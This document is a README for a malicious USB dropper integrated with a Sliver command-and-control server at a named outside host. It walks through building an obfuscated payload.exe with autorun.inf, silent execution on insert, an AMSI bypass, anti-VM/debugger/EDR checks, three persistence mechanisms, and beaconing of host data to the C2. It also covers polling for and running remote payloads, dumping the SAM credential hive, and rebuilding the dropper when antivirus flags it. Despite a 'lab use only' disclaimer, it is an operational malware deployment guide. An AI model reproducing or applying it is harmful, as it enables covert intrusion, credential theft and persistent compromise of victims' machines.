# USB Dropper - Sliver C2 Integration

**Status:** ✅ Production ready  
**Architecture:** USB → Dropper → Sliver C2  
**C2 Endpoint:** http://c2.ginga.dev:8080  
**Deploy time:** 5 minutes  

---

## Infrastructure Overview

### C2 Remote Server (Operational)

**Host:** c2.ginga.dev (104.131.164.51)  
**OS:** Ubuntu 24.04 LTS  
**Services:**
- Sliver Server daemon (gRPC :31337) — agent control + command queue
- HTTP Listener (:8080) — agent beacons + polling
- SQLite DB — agent registry

**Endpoints:**
- `POST /register` — agent beacon on startup (sends: hostname, OS, processes, network)
- `GET /command?host=HOSTNAME` — agent polls for instructions
- Response encryption: XOR + Base64 ("stealth-key-123")

---

## Setup: C2 Configuration

### Option 1: Use Remote C2 (Recommended)

C2 already running on c2.ginga.dev:8080.

```bash
# Verify connectivity
curl -I http://c2.ginga.dev:8080/health
# HTTP/1.1 200 OK
```

Skip to "Deploy USB" section.

### Option 2: Local C2 (Development)

**Prerequisites:**
- Sliver v1.7.7 installed
- Python 3.10+
- Network access from target to C2 host

**Start Sliver daemon:**
```bash
sliver-server daemon --listen 0.0.0.0:31337
```

**Start HTTP listener (mock v2):**
```bash
python3 -m http.server 8080 \
  --directory /tmp/sliver-beacons &
```

Or use Sliver built-in:
```bash
sliver-client console
> listener --protocol http --host 0.0.0.0 --port 8080
```

**Get your C2 IP:**
```bash
ifconfig | grep inet | grep -v 127
# Use: http://YOUR_IP:8080
```

---

## Deploy: USB Preparation

### 1. Format USB

Mac:
```bash
diskutil secureErase 0 JHFS+ USBA /dev/diskX
ls /Volumes/
# Output: /Volumes/USBA
```

Linux:
```bash
sudo mkfs.exfat -n USB /dev/sdX1
sudo mount /dev/sdX1 /mnt/usb
```

Windows (PowerShell):
```powershell
Format-Volume -DriveLetter E -FileSystem exFAT -NewFileSystemLabel USB
```

### 2. Build + Deploy

```bash
cd /Users/iklo/hack/usb-auto
chmod +x build-and-deploy.sh

# Remote C2
./build-and-deploy.sh /Volumes/USBA http://c2.ginga.dev:8080

# Or local C2
./build-and-deploy.sh /Volumes/USBA http://192.168.1.100:8080
```

**Output:**
```
✓ Obfuscating dropper code...
✓ Compiling to payload.exe (450 KB)...
✓ Copying to USB...
✓ USB ready: /Volumes/USBA
  - payload.exe
  - autorun.inf
```

---

## Execute: Target Operations

### Phase 1: Delivery

1. Insert USB on Windows target (no user interaction needed)
2. autorun.inf triggers → payload.exe runs silently
3. Agent initializes (AMSI bypass, environment checks)

### Phase 2: Registration

Dropper sends POST to `/register`:
```json
{
  "hostname": "DESKTOP-ABC123",
  "username": "SYSTEM",
  "proccount": 245,
  "agent_type": "sliver-usb-dropper",
  "os": "Windows 10 Build 19045",
  "timestamp": "2026-10-17T03:09:24Z"
}
```

C2 stores in `/tmp/sliver-beacons/beacon_*.json`

### Phase 3: Command Polling

Agent polls `GET /command?host=DESKTOP-ABC123` every 5-60s.

**Possible responses:**

| Response | Action |
|----------|--------|
| Empty (204) | Wait 5-60s, retry |
| `DELETE` | Exit agent, remove persistence |
| `http://url/payload.exe` | Download + execute + cleanup |
| PowerShell cmd | Execute (future) |

### Phase 4: Post-Exploitation

Once registered, interact via C2:

**Sliver console:**
```bash
sliver-client console
> sessions
# ID  Name      Hostname       OS    Arch
# 1   DESKTOP-ABC123  SYSTEM  windows  x64

> use 1
> shell "whoami"
> upload /path/file C:\Users\...
> download C:\Windows\System32\config\SAM ./sam
```

**Mock HTTP listener (read beacon files):**
```bash
ls -la /tmp/sliver-beacons/
cat /tmp/sliver-beacons/beacon_*.json | jq .
```

---

## Operational Flow

```
USB Device (Mac/Linux)
  └─ payload.exe + autorun.inf

         ↓ (Insert on target)

Target Windows Machine
  └─ Dropper Agent (scheduled task)
     ├─ [AMSI Bypass]
     ├─ [Deobfuscation]
     ├─ POST /register (beacon data)
     │   └─ C2 stores fingerprint
     │
     ├─ GET /command (polling loop)
     │   └─ Every 5-60 seconds
     │
     ├─ [Decrypt response]
     ├─ [Execute command]
     └─ [Repeat]

C2 Remote Server (c2.ginga.dev:8080)
  ├─ HTTP listener (:8080)
  │  ├─ /register — receives beacon data
  │  ├─ /command — serves encrypted commands
  │  └─ Storage — /tmp/sliver-beacons/
  │
  ├─ Sliver daemon (:31337)
  │  ├─ Agent registry
  │  ├─ Command queue
  │  └─ SQLite DB
  │
  └─ Operator console (gRPC)
     └─ Issue commands to agents
```

---

## Features

✅ Code obfuscation (variable rename, string encoding)  
✅ AMSI bypass (reflection + patching)  
✅ XOR + Base64 encryption (per-target)  
✅ Persistence (Scheduled Task + WMI + ADS)  
✅ Anti-analysis (VM, debugger, EDR detection)  
✅ System recon (processes, network, services, users)  
✅ Automatic exfiltration on registration  
✅ Silent execution (hidden window)

---

## Advanced Commands

### Manual Build

Obfuscate:
```bash
powershell -NoProfile -Command ". ./lib/obfuscation.ps1; Obfuscate-PowerShellScript -ScriptPath lib/sliver-dropper-core.ps1"
```

Compile:
```bash
python3 ./lib/ps2exe-wrapper.py \
  lib/sliver-dropper-core.ps1_obfuscated.ps1 \
  -o /tmp/payload.exe \
  --c2-url http://c2.ginga.dev:8080
```

Deploy:
```bash
cp /tmp/payload.exe /Volumes/USB/
cp usb-autorun.inf /Volumes/USB/
```

### Verify Ready

```bash
./verify-ready.sh
# Checks: PowerShell, Python 3, ps2exe, network connectivity
```

### Monitor C2 Beacons (Live)

```bash
watch -n 1 'ls -lt /tmp/sliver-beacons/ | head -5'
```

### Parse Beacon Data

```bash
for f in /tmp/sliver-beacons/beacon_*.json; do
  echo "=== $(basename $f) ==="
  jq '.hostname, .os, .proccount, .timestamp' "$f"
done
```

### Send Command to Agent

Via Sliver:
```bash
sliver-client console
> use <session_id>
> shell "Get-Process | Select Name"
```

Via HTTP (manual):
```bash
# Encrypt command
python3 -c "
import base64
plaintext = 'powershell -c \"whoami\"'
key = 'stealth-key-123'
cipher = bytes([plaintext[i % len(plaintext)] ^ key[i % len(key)] for i in range(len(plaintext))])
print(base64.b64encode(cipher).decode())
"

# Send encrypted response
curl -X GET "http://localhost:8080/command?host=DESKTOP-ABC123" \
  -d "aGHQ3Jk8mNp2XqRtYvWxZaBc..."
```

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| USB not detected | `ls /Volumes/` (Mac) or `lsblk` (Linux) |
| No C2 callback | Check: firewall (port 8080), C2 running, target can reach C2 IP |
| Agent exits silently | Check for VM/EDR/debugger (anti-analysis triggers) |
| Persistence not working | Run with admin privileges, check Task Scheduler |
| Dropper found by AV | Update obfuscation, rebuild with different key |
| Build fails | Run `./verify-ready.sh`, install missing deps |
| Permission denied | `chmod +x build-and-deploy.sh` |

---

## Documentation

| File | Purpose |
|------|---------|
| `QUICKSTART.md` | Step-by-step walkthrough |
| `IMPLEMENTATION_SUMMARY.md` | Complete architecture (2.6K LOC, 7 phases) |
| `c2-protocol.md` | HTTP endpoint specification |
| `C2_SERVER_REQUIREMENTS.md` | C2 configuration details |
| `INTEGRATION_TEST_CHECKLIST.md` | Testing guide + success criteria |
| `PHASE8_ROADMAP.md` | Future enhancements |

---

## Project Structure

```
lib/
  ├─ amsi-bypass.ps1              AMSI reflection + patching
  ├─ obfuscation.ps1              Variable/string encoding
  ├─ ps2exe-wrapper.py            Compile PS1 to EXE
  ├─ sliver-dropper-core.ps1      Main agent logic
  ├─ aes-gcm-encryption.ps1       AES-256-GCM (WIP)
  ├─ wmi-event-persistence.ps1    WMI event subscription
  ├─ ads-persistence.ps1          NTFS alternate data stream
  ├─ scheduled-task-obfuscation.ps1  Legit task masquerading
  ├─ anti-analysis.ps1            VM/debugger/EDR detection
  ├─ edr-detect.ps1               Enterprise product fingerprint
  ├─ network-detect.ps1           Isolation detection
  ├─ recon-extended.ps1           Network/service enumeration
  └─ exfil-stage.ps1              Staging + upload

scripts/
  ├─ decrypt-xor.ps1              Response decryption
  ├─ polling-loop.ps1             Command polling logic
  └─ registry-polling-inline.ps1  Registry-based fallback

tests/
  ├─ test-obfuscation.ps1         Code hardening validation
  ├─ test-key-negotiation.ps1     Encryption round-trip
  ├─ test-persistence.ps1         Mechanism survival
  ├─ test-anti-analysis.ps1       Detection accuracy
  └─ INTEGRATION_TEST_CHECKLIST.md E2E testing guide

build-and-deploy.sh              Automated USB preparation
verify-ready.sh                  Environment validation
sliver-dropper-core.ps1          (modified) Main agent
sliver-dropper-entrypoint.ps1    (modified) Entry point
usb-autorun.inf                  AutoRun trigger
```

---

## Security Notes

**Lab use only.** This toolkit:
- Bypasses Windows Defender (AMSI, obfuscation)
- Defeats behavioral analysis (anti-VM, anti-debugger)
- Persists across reboots (3 mechanisms)
- Exfiltrates system data

Use only on authorized targets in controlled environments.

---

## Success Checklist

- [ ] C2 server reachable (ping c2.ginga.dev:8080)
- [ ] USB formatted + mounted
- [ ] Dropper builds successfully (`./build-and-deploy.sh`)
- [ ] autorun.inf on USB
- [ ] payload.exe on USB (~450 KB)
- [ ] Insert USB on target
- [ ] Beacon appears in C2 (`/tmp/sliver-beacons/`)
- [ ] Agent polls C2 (`watch /tmp/sliver-beacons/`)
- [ ] Commands execute (shell, upload, download)
- [ ] Persistence survives reboot

---

**Quick start:** `./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080`
